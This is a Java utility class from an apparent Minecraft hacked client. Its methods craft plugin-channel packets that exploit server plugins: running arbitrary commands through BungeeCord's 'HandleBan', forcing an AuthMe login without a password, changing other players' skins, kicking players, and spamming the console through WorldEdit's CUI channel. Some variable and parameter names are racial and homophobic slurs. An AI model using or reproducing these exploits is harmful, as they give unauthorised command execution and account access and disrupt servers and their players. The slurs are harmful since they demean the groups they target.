package it.nobusware.client.utils;

import com.google.common.base.Charsets;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;

public class BungeeChannelUtil {

	public static void ChangeSkinForwardCommand(String command, String args, boolean gayman, boolean byemom) {
		System.out.println("Started..");
		try {
			final ByteArrayOutputStream b = new ByteArrayOutputStream();
			final DataOutputStream out = new DataOutputStream(b);
			out.writeUTF(command);
	        out.writeUTF(args);
	        out.writeBoolean(gayman);
	        out.writeBoolean(byemom);
			PacketBuffer buf = (new PacketBuffer(Unpooled.buffer()));
			buf.writeBytes(b.toByteArray());
			sendPacketNoEvent(new C17PacketCustomPayload("changeskin:cmd-frw", buf));
			ChatUtils.print("Sended Packet.");
		} catch (IOException e) {
			ChatUtils.print("Errore Nel Send");
		}
	}
	
	
	public static void sendDefaultChannelMessage(String channel, String message) {
		System.out.println("Started..");
		try {
			final ByteArrayOutputStream b = new ByteArrayOutputStream();
			final DataOutputStream out = new DataOutputStream(b);
	        out.writeUTF(message);
			PacketBuffer buf = (new PacketBuffer(Unpooled.buffer()));
			buf.writeBytes(b.toByteArray());
			sendPacketNoEvent(new C17PacketCustomPayload(channel, buf));
			ChatUtils.print("Sended Packet.");
		} catch (IOException e) {
			ChatUtils.print("Errore Nel Send");
		}
	}
	
	public static void RegisterChannel(String channel) {
		PacketBuffer out = new PacketBuffer(Unpooled.buffer());
		out.writeBytes(channel.getBytes(Charsets.UTF_8));
		sendPacketNoEvent(new C17PacketCustomPayload("REGISTER", out));
	}

	public static void VerusBungeeExploit(String comando) {
		try {
			//VerusBungee
			Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("REGISTER",(new PacketBuffer(Unpooled.buffer())).writeString("BungeeCord")));
			ByteArrayOutputStream b = new ByteArrayOutputStream();
			DataOutputStream out = new DataOutputStream(b);
			out.writeUTF("HandleBan");
			out.writeUTF(comando);
			PacketBuffer negger = (new PacketBuffer(Unpooled.buffer()));
			negger.writeBytes(b.toByteArray());
			sendPacketNoEvent(new C17PacketCustomPayload("BungeeCord", negger));
			ChatUtils.print("Packet Sended.");
		} catch (Exception ex) {
			ChatUtils.print("Errore Nel Send");
		}
	}
	
	public static void SkinRestorerChangeSkin(String trollato, String nomeSkins) {
		try {
			final ByteArrayOutputStream b = new ByteArrayOutputStream();
			final DataOutputStream out = new DataOutputStream(b);
			  out.writeUTF("setSkin");
			  out.writeUTF(trollato);
			  out.writeUTF(nomeSkins);
			PacketBuffer buf = (new PacketBuffer(Unpooled.buffer()));
			buf.writeBytes(b.toByteArray());
			sendPacketNoEvent(new C17PacketCustomPayload("sr:messagechannel", buf));
			//ChatUtils.print("Packet Sended.");
		} catch (IOException e) {
			ChatUtils.print("Errore Nel Send");
		}
	}
	
	public static void SkinRestorerGUI(String player) {
		System.out.println("Started..");
		try {
			final ByteArrayOutputStream b = new ByteArrayOutputStream();
			final DataOutputStream out = new DataOutputStream(b);
			out.writeUTF("OPENGUI");
			out.writeUTF(player);
			PacketBuffer buf = (new PacketBuffer(Unpooled.buffer()));
			buf.writeBytes(b.toByteArray());
			sendPacketNoEvent(new C17PacketCustomPayload("sr:messagechannel", buf));
			ChatUtils.print("Packet Sended.");
		} catch (IOException e) {
			ChatUtils.print("Errore Nel Send");
		}
	}
	
	public static void BungeeVanillaKickDefaultConfig(String p, String reason) {
		System.out.println("Started..");
		try {
			final ByteArrayOutputStream b = new ByteArrayOutputStream();
			final DataOutputStream out = new DataOutputStream(b);
			out.writeUTF("KickPlayer");
			out.writeUTF(p);
			out.writeUTF(reason);
			PacketBuffer buf = (new PacketBuffer(Unpooled.buffer()));
			buf.writeBytes(b.toByteArray());
			Minecraft.getMinecraft().thePlayer.sendQueue.noEventPacket(new C17PacketCustomPayload("BungeeCord", buf));
			ChatUtils.print("§cKicked §a" + p +  " §cFor §a" + reason);
		} catch (IOException e) {
			System.out.println("Errore Nel KickAll");
		}
	}
	
	public static void AuthmeForceLoginExploit(String player) {
		try {
			Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer())).writeString("BAuthMeBridge")));
			ByteArrayOutputStream b = new ByteArrayOutputStream();
			DataOutputStream out = new DataOutputStream(b);
			out.writeUTF("AutoLogin");
			out.writeUTF(Minecraft.getMinecraft().getSession().getUsername());
			PacketBuffer negger = (new PacketBuffer(Unpooled.buffer()));
			negger.writeBytes(b.toByteArray());
			sendPacketNoEvent(new C17PacketCustomPayload("BAuthMeBridge", negger));
			ChatUtils.print("Packet Sended.");
		} catch (IOException e) {
			ChatUtils.print("Errore Nel Send");
		}
	}
	
	public static void WorldEditConsoleSpammer(String messaggio) {
		String nibber = "";
		String a = messaggio +" |";
		for (int i = 0; i < 500; i++) {
			nibber = nibber + a;
		}
		String begin = "v|";
		String message = begin + nibber;
		PacketBuffer out = new PacketBuffer(Unpooled.buffer());
		out.writeBytes(message.getBytes(Charsets.UTF_8));
		sendPacketNoEvent(new C17PacketCustomPayload("WECUI", out));
		ChatUtils.print("Packet Sended.");
	}
	
    public static void sendPacketSilentNetty(Packet packet) {
    	Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(packet);
    }
    
    public static void sendPacketEvent(Packet packet) {
    	Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(packet);
    }
    public static void sendPacketNoEvent(Packet packet) {
    	Minecraft.getMinecraft().thePlayer.sendQueue.noEventPacket(packet);
    }
}